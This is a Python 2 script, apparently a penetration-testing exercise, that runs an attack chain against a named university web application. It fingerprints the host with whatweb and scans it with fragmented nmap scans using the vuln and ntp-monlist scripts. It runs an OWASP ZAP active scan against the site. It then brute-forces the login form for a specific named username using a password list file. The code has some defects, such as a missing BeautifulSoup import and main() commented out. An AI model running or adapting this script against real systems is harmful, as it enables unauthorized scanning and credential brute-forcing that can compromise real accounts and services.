#!/usr/env/ python
# -*- encoding: utf-8 -*-

import socket
import requests
from urlparse import urlparse
from zapv2 import ZAPv2
from pprint import pprint
import sys
import random
import mechanize
import cookielib
import pdb
from time import time
import os

def dominio():
	url=urlparse("https://simcatest.unicauca.edu.co/simca")
	print(url)
	return url

def domineSIMCA(url):
	domine=url.scheme+":"+"//"+url.netloc+url.path
	return domine

def imprimirAmarillo(cadena):
	print(chr (27) +"[1;33m"+ cadena)

def domineTodirIP(url):
	dirIP = socket.gethostbyname(url.netloc)
	imprimirAmarillo("Extrayendo la direccion IP" +dirIP)
	return dirIP

def dirToDomine(dirIP):
	domine =  socket.gethostbyaddr(dirIP)
	print(domine)

	
def huellas(domine):	
	print("Huelas digitales ...")
	os.system("whatweb -v " + domine)

def url():

	url=raw_input(dirIP)
	r=requests.get("http://" + url)
	print(r)
	data=r.text
	soup=BeautifulSoup(data,"lxml")

	for link in soup.find_all('a'):
		print(link.get('href'))

def nmap(dirIP):
	print("Escaneando puertos ...")
	os.system("nmap -f --mtu 24 " + dirIP)
	print("Detectando infraestructura ...")
	os.system("nmap -f --mtu 24 -A " + dirIP)
	print("Detectando servidores ...")
	os.system("nmap -f -Pn --script discovery " + dirIP )
	print("Detectando vulnerabilidades ...")
	os.system("nmap -f --mtu 24 -P0 --script vuln " + dirIP)
	print("Detectando puerto NTP ...")
	os.system("nmap -sU -pU:123 -P0 -n --script=ntp-monlist "+ dirIP )

def owaspZAP():

	
	target = "https://simcatest.unicauca.edu.co/simca"
	zap = ZAPv2()
	zap.urlopen(target)
	#zap.spider.scan(target)
	zap.ascan.scan(target)
	print("Alertas sobre la aplicación ...")
	pprint (zap.core.alerts())

def comentarios(urlTest):
	print ("Analizando comentarios ...")
	os.system("wget "+ urlTest+ " -O page")
	os.system("grep '<!' page")


def fuerza_Bruta():

	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

	login = "https://simcatest.unicauca.edu.co/simca/index.xhtml"
	username = "j_idt11:userName"
	password = "j_idt11:password"

	useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

	br.addheaders = [('User-agent', random.choice(useragents))]

	password = []
	with open("pass.txt", 'r') as f:
	    while True:
	        line = f.readline()
	        if not line:
	            break
	        password.append(line.strip("\n"))
	f.close

	br.open(login)

	for f in br.forms():
	    print f

	tiempo_inicial = time()
	i = 0
	while True:
	    try:
	        br.select_form('j_idt11')
	        print "Iteración no: "+ str(i+1)
	        print "Intentando con el usuario <gjcastro> y contraseña <" + password[i] + ">"
	        br.form['j_idt11:userName'] = 'gjcastro'
	        br.form['j_idt11:password'] = password[i]
	        i += 1
	        
	        br.submit()
	        
	        log = br.geturl()

	    except Exception as e:
	        print "Usuario <gjcastro> y contraseña <" + password[i-1] + ">"
	        break
	tiempo_final = time()
	tiempo_ejecucion = tiempo_final - tiempo_inicial
	print "Tiempo de ejecución "+str(tiempo_ejecucion)+" segundos."
	br.close()
	



def main():
	url=dominio()
	urlTest=domineSIMCA(url)
	dirIP=domineTodirIP(url)
	huellas(urlTest)
	nmap(dirIP)
	#url()
	comentarios(urlTest)
	fuerza_Bruta()
owaspZAP()

#main()



